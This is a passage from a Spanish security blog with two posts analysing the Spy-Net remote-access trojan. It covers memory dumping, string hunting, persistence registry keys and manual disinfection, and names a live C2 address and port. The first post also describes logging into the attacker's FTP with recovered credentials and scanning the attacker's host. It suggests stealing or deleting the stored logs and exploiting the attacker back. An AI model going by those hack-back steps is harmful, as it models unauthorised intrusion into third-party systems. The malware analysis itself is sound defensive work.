host 181.23.131.19:9667 y con un poco de suerte capturaremos las credenciales para validarnos posteriormente<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_1.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Luego de Analizar algunos paquetes, llegamos a la conclusión obvia, de que la comunicación viaja codificada con un cifrado que no logramos reconocer, luego de pensar un poco y sacar mis propias hipótesis bajo mis propios desarrollos de Malware y Crypters, llego a la pregunta:<br /><br />¿En algún momento, el código encriptado se desencripta...? La respuesta es SI<br /><br />Pequeña reseña de como funciona un Malware Encriptado (Crypter):<br /><br />"Un Malware Encriptado es la unión de 2 programas, el Stub y el Malware Encriptado. El stub se encarga de leerse a el mismo buscando un delimitador que le indique que apartir de ese byte todo lo que sigue es el malware Encriptado cargado en memoria, lo desencripta completamente al finalizar <b>OBTIENE UNA VERSIÓN LIMPIA, DESENCRIPTADA Y DESOFUSCADA DEL MALWARE</b>[, que luego envía hacia el RUNPE que se encarga de inyectar el codigo en memoria (String) dentro de un proceso (por ej notepad.exe) que inicia suspendido, una vez la inyección termina con éxito reactiva el proceso (notepad.exe) que realmente ejecuta el codigo inyectado de nuestro malware"<br /><br /><b>OBTIENE UNA VERSIÓN LIMPIA, DESENCRIPTADA Y DESOFUSCADA DEL MALWARE...</b> Joder es el momento ideal para analizar las conexiones que realiza el troyano. <br /><br />La pregunta ahora es... ¿Donde obtengo esa versión limpia? y la respuesta es <b>DESDE LA MEMORIA RAM!!!</b><br /><br />Con la ayuda de nuestro amigo DumpIT (un programa que permite volcar la memoria RAM a un archivo hexadecimal) volcaremos<br />la memoria de nuestra Victima para analizar sus Strings Completamente Desencriptados...<br /><br /><b>Acá existe un punto que aclarar, un volcado de memoria resulta ser bastante sucio ya que vuelca todo lo que este residente en RAM, eso involucra a todos los programas que no son nuestro malware y que estarán complicando nuestro Análisis, una recomendación es reiniciar la pc antes de realizar el volcado, con el fin de liberar la RAM de toda basura que haya quedado residente en memoria. Ademas mientras mayor sea nuestra cantidad de RAM mayor sera el tamaño del fichero de volcado, por lo que si es posible reducir la memoria lo mas que se pueda, en mi caso reduje la memoria de 1 GB a 256 mb para obtener un resultado mas pulcro</b><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_10.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br />Luego de esto abrimos con nuestro editor hexadecimal favorito el archivo .raw que creo DumpIT, como les dije el resultado sera algo bastante sucio y complicado de leer, por el principio de como funciona la RAM y la MEMORY REALOCATION que se encarga de "desfragmentar" la memoria en tiempo real casi como si fuera el garbage colector de JAVA con el fin de liberar memoria q no se este utilizando, y puedo enviar hacia donde mejor considere partes del codigo que queremos analizar, ya que internamente el STACK siempre mantiene un puntero que entrelaza todas las direcciones de memoria que organizan el binario en ejecución. Pero gracias a la opción "SEARCH" podemos buscar Strings por medio de todo el volcado. <br /><br />La pregunta que nace es... ¿Qué buscamos? y para responder esto debemos pensar QUE SABEMOS<br /><br />Lo que sabemos:<br /><br />Nombres de los binarios infectados:<br /><span style="color: red;">update.exe<br />Juego.exe<br />explorer.exe</span><br /><br />Troyano: <span style="color: red;">Spy-Net</span><br />Probablemente utilice algun servicio de refresco automatico de ip:<br /><span style="color: red;">no-ip, dyndns, ddns, etc</span><br /><br />Claves del Registro:<br /><span style="color: red;">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\HKLM"<br />"Software\Microsoft\Windows\CurrentVersion\Run"<br />"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"</span><br /><br />Utilicemos esta información para buscar sobre el volcado de memoria, con un poco de paciencia y arduo Análisis llegamos al siguiente resultado:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_11.png" height="144" onclick="zoomToggle('640px','144px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>En este momento podemos estallar de alegría, ya que hemos obtenido información muy importante<br /><br /><b>Informacion Obtenida:</b><br /><br />El Malware se conecta a 2 host distintos<br />Una posible contraseña de autentificación del Malware<br />Un servicio ftp con Usuario y Contraseña (Probablemente donde se guarden los logs del keyloger)<br /><br />Una visita al ftp revela que hemos dado con el registro de logs del atacante, lo que basicamente significa que hemos obtenido lo mas importante de una botnet, todos los datos tipeados por las victimas (Usuarios, Contraseñas, CreditCards, HomeBanking, etc)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_9.png" height="608" onclick="zoomToggle('640px','608px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Desinfección:<br /><br />En este paso nos haremos de la mano de Apate DNS, un Servidor DNS que nos permite redireccionar todo el trafico saliente hacia una dirección IP especifica, en nuestro caso nuestro "127.0.0.1" (No hay lugar como el hogar)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_13.png" height="456" onclick="zoomToggle('640px','456px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Luego de esto abrimos Spy-Net y configuramos el cliente con los datos que hemos obtenido<br /><br />Puertos: <span style="color: red;">9667</span> y <span style="color: red;">5992</span><br />Pass: <span style="color: red;">XXXXXX</span><br /><br />y esperamos la conexión, en caso de que esta no se realice con exito antes de cuestionar la validez de la password, abrir CurrPorts, y cerrar las conexiónes establecidas por el rat para que este reconecte.<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_3.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br />Desinstalamos el Malware de nuestra maquina, y ahora podemos dar caza al Atacante (robar o borrar sus logs y averiguar un poco mas de el)<br />para esto realizamos un ping para saber si alguno de los host isAlive:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_7.png" height="200" onclick="zoomToggle('640px','200px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />El host esta activo realizamos un pequeño whois:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_2.png" height="262" onclick="zoomToggle('640px','262px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Vemos que el ISP que sirve esa dirección es Telefonica, ahora simplemente podemos llamar al ISP pedir junto con una denuncia la pc que estuvo ocupando ese ip por este periodo de tiempo, y asi poder llevar a la cárcel al dueño de esta botnet.<br /><br />O... podemos indagar un poco mas con NMAP<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s02/1/10/Q1420597131194083_8.png" height="248" onclick="zoomToggle('640px','248px','100%','100%',this);" width="640" /></div><br />Como podemos ver el atacante tiene varios servicios levantados, ahora toca buscar alguna vulnerabilidad en su sistema, adueñarse de su botnet y devolverle el favor de la infección. ¿Cual fue mi decisión....? Lo dejo a su imaginación ;)<br /><div style="text-align: center;"><br /><b>Happy Hunting :)</b></div><br /><br /></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/18/analisis-estatico-spy-net/">Análisis Estático Spy-Net</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-01-18T20:58:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://esmastechandbits.files.wordpress.com/2013/05/dna.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://esmastechandbits.files.wordpress.com/2013/05/dna.png" height="294" width="640" /></a></div><div style="text-align: center;"><div style="text-align: right;"><b>by hdbreaker</b></div><br /></div>Mis mas allegados saben que hace un tiempo he empezado a aumentar mis fronteras en Desarrollo y Análisis de Malware, y me parecio interesante analizar<br /><a name='more'></a> de forma estática el conocido Spy-Net, y ver si podía lograr una desinfección exitosa. El resultado fue mucho mas satisfactorio de lo que esperaba.<br /><br />Escenario: La victima ejecuta un binario de Spy-Net que prometía ser un juego en su pc, este no nota nada inusual nisiquiera una ventana de instalación en su pc,intenta nuevamente la ejecución pero nuevamente nada sucede y antes de decidirse a borrar el archivo se pregunta, estaré siendo victima de un malware. Y pone manos a la obra para Análisar Estaticamente el binario, y ver si entre sus strings, revelan alguna modificación al Sistema Operativo<br /><br />Primero, intenta abrir el binario con un editor hexadecimal:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_1.png" height="124" onclick="zoomToggle('640px','124px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Al bajar unas pocas lineas de código se encuentra con que el binario tiene algunos sectores comprimidos con UPX.<br />Intenta visualizar sin exito algún string desofucado con OllyDBG:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_8.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div style="text-align: center;">(En la imagen se puede apreciar que todos los Strings del archivo estan ofuscados)</div><br />Para asegurar su idea Analiza RDG Packer Detector:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s04/1/1/K14205273581951475_3.png" height="202" onclick="zoomToggle('640px','202px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Esto confirma que detrás del binario hay algo empaquetado y protegido con UPX, además el resultado no denota que el binario este bindeado, por lo que cierra la coincidencia que luego de la ejecución del binario no apareciera ninguna ventana de instalación<br /><br />Se prepara para desempaquetar una copia del archivo para poder Análizar mas profundamente los Strings del binario<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://imageupper.com/s04/1/1/K14205273581951475_1.png" height="334" onclick="zoomToggle('640px','334px','100%','100%',this);" width="640" /></div><br />Luego de esto analiza nuevamente el fichero con RDG Packer Detector:<br /><br /><div class="separator" style="clear: both; text-align: center;">&gt;<img border="0" src="http://s04.imageupper.com/1/1/K14205273581951475_2.png" height="440" onclick="zoomToggle('640px','440px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Esto confirma que efectivamente fue victima de un malware, en este caso Spy-Net, el mismo esta programado en Delphi y su binario esta protegido por Private Exe Protector. Luego de una busqueda sin resultados por un Desofucador de Private Exe Protector y por darse a la caza con un Análisis Dinámico, decide pasar el archivo por DeDe (Delphi Decompiler) con el fin de lograr ver algo que haya quedado sin Ofuscar.<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_3.png" height="392" onclick="zoomToggle('640px','392px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Al bajar un poco, resalta una linea que todo aquel que ha desarrollado un malware en su vida, reconoce...<br /><br /><span style="color: red;">Software\Microsoft\Windows\CurrentVersion\</span><br /><br />Esta famosa linea con alguna que otra variante, indica la posible ejecución de un programa al momento del inicio del sistema.<br /><br />Preocupado la victima decide Analizar mas profundamente las strings del binario con OllyDBG<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s04.imageupper.com/1/1/K14205273581951475_4.png" height="392" onclick="zoomToggle('640px','392px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Entre las lineas que encuentra resaltan las siguientes:<br /><br /><span style="color: red;">Software\Microsoft\Windows\CurrentVersion\Run<br />Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br /><br />Luego de esto pasa a buscar que hay en el registro (regedit.exe) de Windows en esas direcciones<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_2.png" height="76" onclick="zoomToggle('640px','76px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Encuentra la "coincidencia" que en ambas las rutas, encuentra un registro que apunta hacia <span style="color: red;">"C:\Windows\EIS\update.exe"</span>.<br /><br />Acto seguido ejecuta el explorador de archivos y se dirige hacia esa dirección<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_10.png" height="138" onclick="zoomToggle('640px','138px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Encuentra el famoso archivo <span style="color: red;">update.exe</span> y al no estar seguro si este archivo realmente es o no parte del Sistema Operativo, realiza una serie de comprobaciones.<br /><br />Una muy basica, compara el peso de "update.exe" con el peso del archivo original que descargo<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_4.png" height="140" onclick="zoomToggle('640px','140px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Se sorprende un poco y ve que ambos archivos pesan EXACTAMENTE lo mismo. Pero antes de dar fe ciega de que este archivo es el troyano oculto de Spy-Net, decide hacer una comprobación binaria profunda con Hex Workshop para asegurar de que ambos archivos son binariamente iguales, y no solo una coincidencia de peso.<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_13.png" height="406" onclick="zoomToggle('640px','406px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_12.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br />Ambos archivos son binariamente iguales, lo que garantiza que update.exe es el binario oculto de Spy-Net. (En este paso, tambien podrimos haber comparado el md5 checksum para garantizar la igualdad de los ficheros)<br /><br />La Victima se alegra un poco, y decide realizar una desinfección manual.<br /><br /><b>Desinfeccion: </b><br /><br />Elimina ambos binarios.<br />Elimina las claves en el registro de windows.<br />Destildar todo lo que apunte a update desde msconfig.<br /><br />(Esto es para eliminar las entradas destildadas en el msconfig)<br />Elimina todas las carpetas del registro que hagan referencias al binario en las rutas: <br /><br /><span style="color: red;">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupfolder"<br /><br />"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" </span><br /><br />Para esto debe iniciar su pc en Modo Seguro al inicio.<br /><br /><div style="text-align: center;"><h2>Inicio Modo Seguro</h2></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s03.imageupper.com/1/3/X1420526754195881_5.png" height="148" onclick="zoomToggle('640px','148px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><h2>Elimino Binarios</h2></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_9.png" height="394" onclick="zoomToggle('640px','394px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><h2>Elimino Entradas de Registro</h2></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_11.png" height="204" onclick="zoomToggle('640px','202px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br /><div style="text-align: center;"><h2>Destildo entradas relacionadas en MSCONFIG</h2></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s03.imageupper.com/1/3/X1420526754195881_4.png" height="130" onclick="zoomToggle('640px','130px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><h2>Borro Claves de configuración de MSCONFIG</h2></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_14.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div>Luego reinicia y puede garantizar una desinfección correcta por medio de un Análisis Dinámico. <br /><br />En este caso dejo una imagen del Panel de Control, antes y después del Análisis.<br /><br /><b>Antes del Análisis:</b><br /><div style="text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_6.png" height="82" onclick="zoomToggle('640px','82px','100%','100%',this);" width="640" /></div><b>Después del Análisis:</b><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://s02.imageupper.com/1/3/G14205261031951839_5.png" height="82" onclick="zoomToggle('640px','82px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><br /></div><br /><div style="text-align: center;"><b>Happy Hunting!</b></div><br /></div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="4">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="2">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! by hdbreaker</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF </a>
      </li>
    
  </ul>
</section>





  
</aside>

      </div>
    </div>
    <footer role="contentinfo"><p>
  Copyright &copy; 2016 - q3rv0 - hdbreaker -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a>. Design by <a href="http://octopressthemes.com">Octopress Themes</a></span>
</p>

</footer>
    







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





  </div>
</body>
</html>
